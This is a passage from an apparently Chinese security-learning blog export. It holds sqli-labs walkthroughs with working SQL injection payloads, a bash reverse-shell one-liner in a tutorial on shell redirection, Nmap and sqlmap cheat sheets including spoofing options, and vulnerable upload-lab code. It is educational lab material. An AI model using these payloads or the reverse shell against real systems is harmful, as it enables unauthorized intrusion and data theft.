0,1\";`\n\n### 5-6报错注入或盲注\n\n第五题后端主要代码\n\n```php\n$id = '\"'.$id.'\"';\n$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";\n$result=mysql_query($sql);\n$row = mysql_fetch_array($result);   //从结果集中取出一行作为数组，返回生成的数组，没有返回false\n\tif($row)\n\t{\n  \techo '<font size=\"5\" color=\"#FFFF00\">';\t\n  \techo 'You are in...........';\n  \techo \"<br>\";\n  \techo \"</font>\";\n  \t}\n\telse \n\t{\n\t\n\techo '<font size=\"3\"  color= \"#FFFF00\">';\n\tprint_r(mysql_error());    //返回上一个 MySQL 函数的错误文本,没有出错则返回 ''（空字符串）。\n\techo \"</br></font>\";\t\n\techo '<font color= \"#0000ff\" font size= 3>';\t\n\t\n\t}\n}\n\telse { echo \"Please input the ID as parameter with numeric value\";}\n```\n\n三种报错注入方式：\n\n- 通过floor报错\n- 通过updatexml报错\n- 通过extractvalue报错\n\nfloor报错注入原理\n\n语句：`union select count(*),1,concat('~',(select schema_name from information_schema.schemata limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x`\n\n语句中用到了几个函数：\n\nrand() 随机生成0-1之间的数\n\n![1](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/55EUMA%249N8E4VLT%5D%60EK%25VXL.png)\n\nfloor() 向下取整\n\n![2](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/5M%28%408DVRQXZFA_%29_XMLB%60UP.png)\n\nconcat() 字符串拼接\n\n![4](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/U0%28I%40%5D%29%7BF%5B3B%60%7B%7DEX_J9JFS.png)\n\ncount() 计数\n\ngroup by 分组排序\n\n对语句进行分析：\n\n`(select schema_name from information_schema.schemata limit 0,1)`  取出第一个数据库名\n\n`floor(rand(0)*2) `生成有规律的数字0,1,1,0,1,1,1...........\n\n![3](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/YXS%401KQMY8E%40FLTPT%24%40R6GX.png)\n\n![5](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/L8HUKZE29GD%25%28P%5B9A_TRNNN.png)\n\n`concat('~',(select schema_name from information_schema.schemata limit 0,1),floor(rand(0)*2))x`拼接出以下字符串取别名x\n\n`~db_name0     ~db_name1  ~db_name1   ~db_name0` .......\n\n`concat('~',(select schema_name from information_schema.schemata limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x`\n\n以别名x分组排序，这个时候并不能完成报错注入 执行结果如下：\n\n![6](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/%7DBFD_%60%25XRUHJ%7DFJUWG%245YCU.png)\n\n看完整代码\n\n`union select count(*),1,concat('~',(select schema_name from information_schema.schemata limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x`\n\n加上`count(*)`就构成了报错注入，主要是因为在count()和group by进行分组排序计数的时候，默认x的值为主键，\\~db_name0     \\~db_name1 插入新表时，不会报错，下一个\\~db_name1插入时，由于主键重复，就会报错\\~db_name1的内容。\n\n![7](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/1OFF.png)\n\nupdatexml 和extractvalue报错原理\n\n正常情况下updatexml函数的使用方式：`UPDATEXML (XML_document, XPath_string, new_value);`\n\n第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc\n第二个参数：XPath_string (Xpath格式的字符串) \n第三个参数：new_value，String格式，替换查找到的符合条件的数据\n作用：改变文档中符合条件的节点的值\n\n报错paylod：`updatexml(1,concat(null,(select @@version),null),1);`\n\n原理：第二个参数要求为xpath格式的字符串，不符合就报错。最大报错长度32位。\n\n正常情况下extractvalue函数的使用方式：`EXTRACTVALUE (XML_document, XPath_string);`\n\n第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc\n第二个参数：XPath_string (Xpath格式的字符串)\n\n报错paylod：extractvalue(1,concat(null,(select @@version))\n\n#### 7文件写入\n\nmysql能写shell的要求为管理员权限加上`secure_file_priv=on`\n\n如何查看是否开启：`SHOW variables like '%secure%';`\n\n查看是否具有读写权限：`and (select count(*) from mysql.user)>0 `\n\n写入文件：` union select 1,\"<?php phpinfo(); ?>\",3 into outfile \"F:\\\\service\\\\php_study\\\\PHPTutorial\\\\WWW\\\\sql\\\\sqli-labs\\\\Less-7\\\\1.php\"`\n\n![1](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/HV1BTVEWUY0IF3C5G45MSBA.png)\n\n![4](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/FB%24UD1IF%241KIW_%5DJ7ARO%7D6Q.png)\n\n### 8-10布尔型注入\n\n- 时间判断\n- 返回页面判断\n\n相关函数：\n\n`substr`  `length`  `ascii`  `sleep`  `if` \n\n比较费劲的注入方式，要自己构造payload一个一个试。\n\n### 11-17POST型注入\n\n第十一题后台主要代码`@$sql=\"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\";`\n\n构造提交的变量闭合语句就可以了\n\npayload：`uname=admin'#&passwd=1`\n\n第十二题后台主要代码`@$sql=\"SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1\";`\n\npayload:`uname=admin\")#&passwd=1`\n\n第十三题后台主要代码`@$sql=\"SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1\";`\n\npayload：`uname=admin' )# &passwd=1`\n\n第十四题后台主要代码`@$sql=\"SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1\";`\n\npayload：`uname=admin\" # &passwd=1`\n\n第十五题后台主要代码：\n\n```php\n$uname='\"'.$uname.'\"';\n$passwd='\"'.$passwd.'\"'; \n@$sql=\"SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1\";\n```\n\npayload：`uname=admin' # &passwd=1`\n\n第十六题后台主要代码：\n\n```php\n$uname='\"'.$uname.'\"';\n$passwd='\"'.$passwd.'\"'; \n@$sql=\"SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1\";\n```\n\npayload：`uname=admin\") # &passwd=1`\n\n第十七题后台主要代码:`$update=\"UPDATE users SET password = '$passwd' WHERE username='$row1'\";`\n\npayload：`uname=admin &passwd=1'#`\n\n![17](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/7TV%7BU9TLQU%40RCD_8NY1LQZT.png)\n\n### 18-19head头注入\n\n源码中对传入的uname和passwd都进行了检查，但是我们可以利用对http请求头中内容从查询`$uagent = $_SERVER['HTTP_USER_AGENT'];$IP = $_SERVER['REMOTE_ADDR'];`进行注入。\n\n第十八题后台主要代码：`$insert=\"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)\";;`\n\n利用burp抓包更改User-Agent\n\n![1](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/E8XQMIN%7D%5B6A41KY%5BN19MPG6.png)\n\npayload：`'and '1'='1`\n\n![11](http://pw5q6scnw.bkt.clouddn.com/%250DLYH%29%5DXA0OMHPBA5~J25U.png)\n\n第十九题后台主要代码：`$insert=\"INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')\";`\n\n利用burp抓包更改Referer\n\n![6](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/VDRK05%241C%24IK1%60%40J005N0DH.png)\n\npayload：`and '1'='1`\n\n![9](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/EUQQSU5DML7JQYJ7GRZAIFP.png)\n\n\n\n---\n\n\n\n未完待续......\n\n人们只愿看到自己想看到的一切，分不清是非对错，黑白颠倒。--Hades","tags":["sql注入"]},{"title":"基于centos的linux学习4","url":"%2F2019%2F08%2F14%2F%E5%9F%BA%E4%BA%8Ecentos%E7%9A%84linux%E5%AD%A6%E4%B9%A04%2F","content":"\n### 1.Linux环境下的账户系统文件\n\n##### /etc/passwd\n\n/etc/passwd文件中每行定义一个用户账户，一行中又划分为多个字段定义用户账户的不同属性，各字段间用\":''分割。任意用户可读。\n\n![1](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/3K.png)\n\n| 字段       | 说明                                                         |\n| ---------- | ------------------------------------------------------------ |\n| 用户名     | 用户登录系统时使用的用户名，在系统中唯一。                   |\n| 口令       | 存放加密的口令，x表示用户的口令是被/etc/shadow文件保护的。   |\n| 用户标识符 | 是一个整数，系统内部用它来标识用户，每个用户的UID都是唯一的。root的为0，从1-499是系统的标准账户。普通用户的UID从500开始。 |\n| 组标识符号 | 是一个整数，系统用它来标识用户所属的组。每个用户账户在建立好后都会有一个主组，主组相同的账号其GID相同。 |\n| GECOS      | 存放用户全名、地理位置等信息。                               |\n| 宿主目录   | 用户登录系统后进入的目录。                                   |\n| 命令解释器 | 指示该用户使用的shell，默认bash。                            |\n\n##### /etc/shadow\n\n/etc/shadow中存放加密的用户口令，只对root用户可读且提供一些口令时效字段。\n\n![2](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/15.png)\n\n| 栏位               | 说明                                 |\n| :----------------- | :----------------------------------- |\n| 用户名             | 用户的账户名                         |\n| 口令               | 用户的口令，经过SHA512加密           |\n| 最后一次修改的时间 | uninx元年到最后一次修改的天数        |\n| 最小时间间隔       | unix元年到用户可以更改口令的天数     |\n| 最大时间间隔       | unix元年到用户必须更改口令的天数     |\n| 警告时间           | 在用户口令过期之前多少天提醒用户更新 |\n| 不活动时间         | 在用户口令过期之后到禁用账户的天数   |\n| 失效时间           | unix元年到账户被禁用的天数           |\n| 标志               | 保留位                               |\n\n##### /etc/group\n\n/etc/group中存放用户的组信息，当一个用户同时是多个组的成员是，在/etc/passwd文件中记录的是用户所属的主组，也就是登陆时所属的主组，而其他组成为附加组。用户要访问附件组的文件时，必须要使用newgrp命令是自己成为该组成员。该文件对所以用户可读。\n\n![3](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/Y.png)\n\n| 栏名   | 说明                       |\n| ------ | -------------------------- |\n| 组名   | 该组的名称                 |\n| 组口令 | 由于安全原因，x占位        |\n| GID    | 组的识别号                 |\n| 组成员 | 属于该组的成员，用“，”分割 |\n\n##### /etc/gshadow\n\n/etc/gshadow用于定义用户组口令、组管理员等信息。只有root用户可读取。\n\n![4](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/a.png)\n\n| 栏名           | 说明                                               |\n| -------------- | -------------------------------------------------- |\n| 组名           | 组名称，该字段与group文件中的组名称对应            |\n| 组口令         | 组口令，该字段用于保存已加密的口令                 |\n| 组的管理员账户 | 组的管理员账号，管理员有权对该组添加，删除账号     |\n| 组成员         | 属于该组的用户成员列表，列表中多个用户间用‘，’分隔 |\n\n### 2.管理账户的命令行工具\n\n| 命令                   | 说明                                               |\n| ---------------------- | -------------------------------------------------- |\n| useradd[选项]<用户名>  | 添加新用户                                         |\n| usermod[选项]<用户名>  | 修改已经存在的指导用户                             |\n| userdel[-r]<用户名>    | 删除已经存在的指导目录，-r参数用于删除用户自家目录 |\n| groupadd[选项]<用户名> | 添加新的组                                         |\n| groupmod[选项]<用户名> | 修改已经存在的组                                   |\n| groupdel<用户名>       | 删除已经存在的指定组                               |\n\n### 3.口令管理和口令时效\n\n(1.)使用passwd命令进行口令管理\n\n格式：`passwd[选项][用户名]`\n\n| 选项 | 说明               | 选项    | 说明                                     |\n| ---- | ------------------ | ------- | ---------------------------------------- |\n| -S   | 列出口令的状态信息 | -d      | 删除口令                                 |\n| -l   | 锁定用户账户       | -k      | 保持口令不变，直到口令过期失效后方能更改 |\n| -u   | 解除已锁定账户     | --stdin | 从标准输入读取口令（非交互模式）         |\n\n（2.）chage命令\n\n口令时效：强制用户在一段时间之后修改口令的机制成为口令时效。\n\nliunx系统上，修改口令时效分为\n\n- 对于未来要创建的所以用户的口令时效需修改/etc/login.defs文件的相关参数\n- 对以及存在的用户修改口令时效是通过chage命令来管理\n\n设置新添用户的口令时效\n\n| 参数          | 说明                                                    |\n| ------------- | ------------------------------------------------------- |\n| PASS_MAX_DAYS | 设置在多少天后要求用户修改口令，默认口令时效天数为99999 |\n| PASS_MIN_DAYS | 设置口令修改后，至少要经过多少天后才允许修改            |\n| PASS_WARN_AGE | 设定在口令时效前多少天开始通知用户更改口令              |\n\n设置已经存在用户的口令时效\n\n格式：`chage[选项]<用户登录名>`\n\n| 选项     | 描述                                                         |\n| -------- | ------------------------------------------------------------ |\n| -m days  | 指定用户必须改变口令所间隔的最少天数，值为0，口令不会过期    |\n| -M days  | 指定口令有效的最多天数                                       |\n| -d days  | 指定自从unix元年其，口令被改变的天数                         |\n| -I  days | 指定口令过期后，账户被锁前不活跃的天数，值为0，账户在口令过期后不会被锁 |\n| -E date  | 指定账号被锁的日期                                           |\n| -W days  | 指定口令过期前要警告用户的天数                               |\n| -l       | 列出指定用户当前的口令时效信息                               |\n\n### 4.用户和组状态\n\n| 命令   | 功能                                                   |\n| ------ | ------------------------------------------------------ |\n| whoami | 用于显示当前用户的名称                                 |\n| id     | 用于显示用户身份                                       |\n| groups | 用于显示指定用户所属的组                               |\n| newgrp | 用于将用户从当前组转换到附加组，用户必须属于该组才可以 |\n\n\n\n---\n\n\n\n未完待续......\n\n人们只愿看到自己想看到的一切，分不清是非对错，黑白颠倒。--Hades\n\n","tags":["linux"]},{"title":"基于centos的linux学习3","url":"%2F2019%2F08%2F13%2F%E5%9F%BA%E4%BA%8Ecentos%E7%9A%84linux%E5%AD%A6%E4%B9%A03%2F","content":"\n### 1.Shell变量的分类\n\n内部变量：\n\n系统提供，用户只能使用不能修改。\n\n环境变量：\n\n决定了用户的工作的环境，不需要定义可直接在shell中使用，某些可修改。\n\n用户变量\n\n用户建立和修改，也称为用户自定义变量。\n\n### 2.Shell中变量的定义和输出\n\n格式：`name=string`\n\nname为变量名，以字母或下划线开头的字母、数字和下换线字符序列。\n\n“=”为赋值符号，两边不能直接跟空格，否则shell将视为命令。\n\nstring是被赋予的变量值，若string中包含空格、制表符和换行符，则string必须用'string'或\"string\"的形式，双引号允许变量替换，单引号不允许。\n\n通常在变量名前加$符号引用变量的值，变量的输出可使用shell的内置命令echo或printf。\n\n可以属于unset命令取消shell变量的声明\n\n### 3.Shell变量的作用域\n\n局部变量：\n\n作用范围仅限制在其命令行所在的shell或当前shell脚本执行过程中。\n\n全局变量：\n\n作用范围包含定义该变量的shell以及其所有子shell。\n\n### 4.Shell环境变量\n\n环境变量定义shell的运行环境，shell用环境变量来确定查找路径、注册目录、终端类型、终端名称、用户名等。\n\n| 环境变量名 | 说明                       | 环境变量名 | 说明                         |\n| ---------- | -------------------------- | ---------- | ---------------------------- |\n| BASH       | bash的完整路径名           | PATH       | bash寻找看执行文件的搜索路径 |\n| EDITOP     | 应用程序中默认使用的编辑器 | ENV        | linux查找配置文件的路径      |\n| HISTFILE   | 用于储存历史命令的文化     | PS1        | 命令行的一级提示符           |\n| HISTSIZE   | 历史命令列表的大小         | PS2        | 命令行的二级提示符           |\n| HOME       | 当前用户的用户目录         | PWD        | 当前工作目录                 |\n| OLDPWD     | 前一个工作目录             | USER       | 当前用户名                   |\n| IFS        | 用于分割命令行参数的分割符 | UID        | 当前用户的uid                |\n| SECONDS    | 当前shell开始后流逝的秒数  | TERM       | 当前用户的终端类型           |\n\n### 5.重定向/ bash反弹shell原理\n\n所谓重定向，就是不使用系统的标准输入端口、标准输出端口或标准错误端口，而进行重新的指定。\n\n标准设备\n\n| 名称   | 代号 | 代表意思 | 设备   | 说明                                   |\n| ------ | ---- | -------- | ------ | -------------------------------------- |\n| STDIN  | 0    | 标准输入 | 键盘   | 命令在执行时所要的输入数据通过它来取得 |\n| STDOUT | 1    | 标准输出 | 显示器 | 命令执行后的输出结果从该端口送出       |\n| STDERR | 2    | 标准错误 | 显示器 | 命令执行时的错误信息通过该端口送出     |\n\n重定向符\n\n| 重定向符   | 说明                                                         |\n| ---------- | ------------------------------------------------------------ |\n| <          | 实现输入重定向。                                             |\n| <<!......! | 实现输入重定向的特例，即here文件。                           |\n| >或>>      | 实现输出重定向，>实现覆盖式输出重定向，>>实现追加式输出重定向 |\n| 2>或2>>    | 实现错误重定向。                                             |\n| &>         | 同时实现输出重定向或错误重定向。                             |\n\n了解了上面这些，我们来看一下利用重定向在linux下反弹shell的原理。\n\nKail linux 192.168.3.79\n\nCentos7   192.168.3.83\n\nnc： TCP/IP 协议中的swiss army knife，是一个使用tcp或udp协议通过网络连接来读取数据的一个工具。\n\nbash：unix shell  参数 -i创建一个交互式的bash\n\n如果我们不使用输出重定向，echo输出的字符会显示在本地的屏幕上。\n\n![1](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/5.png)\n\n在kail下开启端口监听  `nc -lvp 9999` ，然后我们使用输出重定向符将字符输出到kail的显示屏上。加上bash -i 以后我们在192.168.3.79和192.168.3.83之间建立了一个交互式的bash，将192.168.3.83的输出重定向到了192.168.3.79。\n\n![2](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/6.png)\n\n接下来尝试一下从192.168.3.79输入重定向到192.168.3.83。\n\n![3](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/7.png)\n\n知道了输入重定向和输出重定向的原理，把这两个结合其他，就实现了shell的反弹。\n\n`nc -lvp 9999`  `bash -i &> /dev/tcp/192.168.3.79/9999 0<&1`\n\nkail本地监听端口9999，centos输入重定向到192.168.3.79，输出也重定向到192.168.3.79。就相当于centos的命令输入、显示结果都在192.168.3.79的终端屏幕上。也就实现了shell的反弹。\n\n### 6.管道/命令替换/命令组合\n\n管道：\n\n管道线中的每一条命令作为一个单独的进程运行，前一个命令的输出作为下一个命名的输入。单向，从左到右顺序执行。\n\n格式：命令1|命令2|.......\n\n命令替换：\n\nshell中的命令参数可以由另一个命令执行的结果替代。\n\n格式：$cmd1`cmd2 arguments`      $cmd1 $(cmd2 arguments)\n\n命令组合：\n\n在一个命令行上使用若干shell的元字符将若干命令组合在一起。\n\n| 命令行形式   | 说明                          |\n| ------------ | ----------------------------- |\n| CMD1;CMD2    | 顺序执行一组命令序列          |\n| {MD1;MD2;}   | 在当前shell中执行一组命令序列 |\n| (CMD1;CMD2)  | 在子shell 中执行一组命令序列  |\n| CMD1&&CMD    | 与逻辑，CMD1成功才执行2       |\n| CMD1\\|\\|CMD2 | 或逻辑，CMD1失败才执行2       |\n\n","tags":["linux"]},{"title":"渗透测试中的工具利用","url":"%2F2019%2F08%2F13%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%B7%A5%E5%85%B7%E5%88%A9%E7%94%A8%2F","content":"\n### Burp\n\nHttps证书配置：\n\nburp官网下载CA证书，浏览器设置配置，导入证书机构勾选服务权限进行抓包。\n\n![1](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/1.png)\n\n![2](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/2.png)\n\nBurpSuite 模块介绍：\n\n- targer 显示历史站点 收入到scope中 可特别显示\n- spider 爬虫  右键send to spider \n- scanner 扫描 静态扫描/动态扫描\n- extender 插件 java/ruby/python\n- comparer 比较 对收集的数据包进行比较\n- repeater 复现 方便对收集的数据包进行更改以及查看更改后的结果\n- sequencer 计数器 cookie伪造 可以对网站cookie的复杂度进行分析\n- intruder 攻击\n\n| Sniper模式           | Battering ram模式    | Pitchfork模式        | Clusterbomd模式      |\n| -------------------- | -------------------- | -------------------- | -------------------- |\n| 一个变量单一匹配爆破 | 一个变量重复匹配爆破 | 两个变量单一匹配爆破 | 两个变量交叉匹配爆破 |\n\nPayload的几种模式\n\nsimple list 简单表单\n\nruntime file  文件字典\n\ncase modification 大小写改变\n\nnumber 自动生成数字\n\ndate 日期\n\nbrute forcer 暴力枚举\n\nnull payloads  空payloads\n\n### Nmap\n\nnmap 【空格】 【选项|多选项|协议】 空格 目标 masscan 快速扫描端口\n\nnmap支持的协议和对应编号：\n\n（1.）TCP    6（2.）ICMP  1（3.）igmp  2（4.）udp   17\n\n可指定协议向目标主机发送数据包判断目标主机是否在线。\n\n1.-A 全面扫描  \n\n2.ip/20 扫描网段 \n\n3.-p 端口 指定端口扫描 \n\n4.-v 查看版本 \n\n5.-sP ping扫描 \n\n6.P0 无ping扫描 \n\n7.nmap -PS tcp syn ping扫描  -v显示过程 \n\n8.-PA tcp ack ping扫描 \n\n9.-PU udp\n\n10.-PE  icmp -PP icmp时间戳 -PM icmp地址掩码\n\n11.-PR  ARP扫描 \n\n12.-PY  SCTP init ping扫描 \n\n13.-n  禁止dns反向解析 \n\n14.-R  反向域名解析\n\n15.--system-dns 使用系统域名解析器 \n\n16.-sL 列表扫描\n\n17.-6 扫描tpv6地址 \n\n18.--traceroute 路由跟踪\n\n19.-F 快速扫描端口，扫描有限的端口 \n\n20.-r 随机扫描 \n\n21.--top-ports 数量（默认高危端口数量）\n\n22.-sS tcp syn 扫描 \n\n23.-sT TCP连接扫描 最稳定的扫描方式\n\n24.-sU udp扫描  非常缓慢\n\n25.-sN 空扫描 \n\n26.-sF fin扫描 使用tcp syn 扫描被防火墙拦截后 使用fin扫描穿透防火墙\n\n27.-sA  tcp ack扫描 不能确定端口是开放还是被过滤\n\n端口状态：\n\nopen   close   \n\nfiltered 防火墙过滤或者网络堵塞  \n\nunfitered 未被过滤，端口可访问 但是无法判断开发还是关闭\n\nopen|fitered 开放还是过滤    \n\nclose|fitered 不能确定是关闭还是被过滤 只可能出现在ipid idle\n\n时序选项：\n\n使用-T（0-5）启动时序扫描\n\n-T0 慢  -T1 缓慢 -T2 降低速度 -T3 根据目标自动调整 -T4 野蛮的 -T5 疯狂的 急速扫描\n\n指纹识别：\n\n1.-sV 版本探测 \n\n2.-sV --allports nmap默认跳过9100tcp端口 只有使用--allports 才可以扫描所有端口   \n\n3.-version-intensity 0-9 扫描强度设置 默认7  --version-light 2 --version-all 9\n\n4.--version-trace 获取详细版本信息\n\n5.-sS -sR rpc扫描 扫描对所以被发现开发的tcp/udp端口执行sunrpc程序null命令来确定是否为rpc端口，是则返回程序和版本号\n\n6.-O 启用操作系统扫描 \n\n7.--osscan-limit 对指定的目标进行操作系统检测 --osscan-guess 推测系统并识别\n\n结果输出：\n\nnmap -F -oN text.txt IP地址 标准保存txt\n\n-oX  xml保存  -oS  133t保存  -oG  grep保存  -oA  所有格式保存  --append-output -oN 补充保存文件\n\n脚本引擎：\n\n--script=类别这种方式 脚本目录/usr/share/nmap/scriptnmap \n\n防火墙欺骗：\n\n-f        报文分段\n\n--mtu 指定偏移大小 设置输出数据包时的最大传输大小 8的倍数\n\n-D      ip欺骗nmap \n\n-D 【dacoy1，docoy2...|RND:number】【目标】\n\n使用-D选项可以指定多个ip地址 或使用rnd 随机生成几个ip地址 \n\n源地址欺骗-sL 地址\n\n源端口欺骗 --source-port 端口 IP地址\n\n指定发包长度--date-length\n\nmac地址欺骗--spoof-mac 参数 0随机 MAC Address用户手动指定 Vendor Name指定厂商生成 \n\n### Sqlmap\n\n-v 查看过程 七个顶级 默认1 \n\n-u 或-url  目标url 可直接查看目标网站是否具有注入\n\n-l   可以导入burp proxy中的日志\n\n-m 将文本中的url以此检测 可将多个目标网站url保存文本文件进行注入判断\n\n-r   从一个文本中获取http请求 可以跳过设置一些参数 可以使用burp抓包 用于对需要cookie的网站\n\n-r -force-ssl  https 或者在数据包文件中设置端口443\n\n--data 允许把数据以post请求发生 参数加引号参数 \n\n-cookie -load-cookies -drop-set-cookie  对于不采用-r 请求网站报文文件 但是需要cookie的 可以设置cookie值\n\n-user-agent，-random-agent 设置伪造http请求头中user-agent值\n\n-referer    设置位置请求中的http头的referer 当-lever参数设定为3或者为3以上的时候会尝试referer或user-angent注入\n\n-headers  额外的http头  可以通过-headers参数增加额外的https\n\n-delay      http请求延迟  可以设定两个http（s）请求间的延迟 默认没有延迟\n\n-timeout   设定超时时间  设置一个http（s）请求超过多少时间判断为超时 默认30秒\n\n-retries    设置重试超时  当http（s）超时时，可以设置重新尝试连接次数 默认3次\n\n-eval      每次请求时候执行自定义的python代码\n\n-p   手动设置想要测试的参数  -skip    手动设置不想要测试的参数   -dbms    指定数据库\n\n-os  指定数据库服务器系统    -invalid-bignum   指定无效的大数字    报错注入时使用\n\n-prefix -suffix     在payload 前后加字符    \n\n-level    五个等级  使用的payload 在xml/payloads.xml中可以看到 默认为1\n\n-risk     四个风险等级 \n\n1测试大部分语句        2会增加基于事件的测试语句         3会增加or语句的sql注入测试\n\n-time-sec        设定延迟注入的时间      默认5秒\n\n-union-cols     设定union查询字段数   默认1-10 \n\n-b -banner     返回数据库的版本号 通常是函数version（） 或者变量@@version\n\n-current-user 在大多数数据库中可以获取到数据库的用户\n\n-current-db    返回当前连接的数据库\n\n-is-dba           用户是否为管理 返回true\n\n--users           列出数据库用户\n\n-password     列出并破解数据库用户的hash\n\n-privileges     列出数据库管理员权限\n\n--roles           列出数据库管理员角色\n\n-dbs              列出系统数据库\n\n-dump -C -T -D 列出整个表的数据\n\n-dump-all      获取所以数据库表的内容\n\n-sql-query -sql-shell 运行自定义的sql语句\n\n-schema -exclude-sysdbs 列出数据库系统的架构\n\n-count   取表中数据的个数\n\n-tables -exclude-sysdbs -D 列出数据库表\n\n-columns -C -T -D  列出数据库表中的字段\n\n\n\n---\n\n\n\n未完待续......\n\n人们只愿看到自己想看到的一切，分不清是非对错，黑白颠倒。--Hades\n\n","tags":["tools"]},{"title":"上传文件中后台代码判断非法文件的几种情况","url":"%2F2019%2F08%2F13%2F%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E4%B8%AD%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E5%88%A4%E6%96%AD%E9%9D%9E%E6%B3%95%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%83%85%E5%86%B5%2F","content":"\n### 1.Javascript 前端文件类型检查\n\n```php+HTML\n<script type=\"text/javascript\">\n    function checkFile() {\n        var file = document.getElementsByName('upload_file')[0].value;\n        if (file == null || file == \"\") {\n            alert(\"请选择要上传的文件!\");\n            return false;\n        }\n        //定义允许上传的文件类型\n        var allow_ext = \".jpg|.png|.gif\";  \n        //提取上传文件的类型\n        var ext_name = file.substring(file.lastIndexOf(\".\"));\n        //判断上传文件类型是否允许上传\n        if (allow_ext.indexOf(ext_name) == -1) {\n            var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name;\n            alert(errMsg);\n            return false;\n        }\n    }\n</script>\n```\n\n### 2.基于Content-Type的检测\n\n```php\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name'];          \n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '文件类型不正确，请重新上传！';\n        }\n    } else {\n        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';\n    }\n}\n```\n\n![1](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/EY%40%5D%7BVWWENE%40VV1%7BG_%28ZLX8.png)\n\n### 3.基于php内置函数去除非法字符的检测\n\n```php\n if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array('.asp','.aspx','.php','.jsp');\n        $file_name = trim($_FILES['upload_file']['name']); //取出上传文件的文件名\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');  //收集.后的字符，并返回该字符到结尾的字符串\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //收尾去空\n\n        if(!in_array($file_ext, $deny_ext)) {        //判断后缀是否非法\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;            \n            if (move_uploaded_file($temp_file,$img_path)) {\n                 $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n\n### 4.基于黑名单加内置函数去除干扰字符的检测\n\n```php\n$deny_ext = 